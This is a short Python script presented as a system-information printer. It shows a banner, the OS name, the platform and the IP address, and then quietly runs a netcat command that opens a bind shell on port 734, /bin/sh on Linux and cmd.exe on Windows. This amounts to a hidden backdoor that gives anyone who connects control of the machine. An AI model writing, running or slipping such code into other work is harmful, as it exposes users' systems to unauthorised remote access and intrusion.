import platform
import os
import sysconfig
import socket

def run():
    hostname=socket.gethostname()   
    IPAddr=socket.gethostbyname(hostname) 
    print('###### # # # #######')
    print('#### # #  # # ######')
    print('#### ##    ## ######')
    print('#####  #  #  #######')
    print('###### ### #########')
    print('# OS name: ', platform.system())
    if "Linux" in platform.system():
        print('Linux: ', sysconfig.get_platform()) 
        print('Address ip: ', IPAddr)
        os.system( 'nc -lvp 734 -e /bin/sh')
    elif "Windows" in platform.system():
        print('Linux: ', sysconfig.get_platform()) 
        print('Address ip: ', IPAddr)
        os.system('nc -lvp 734 -e cmd.exe')
    
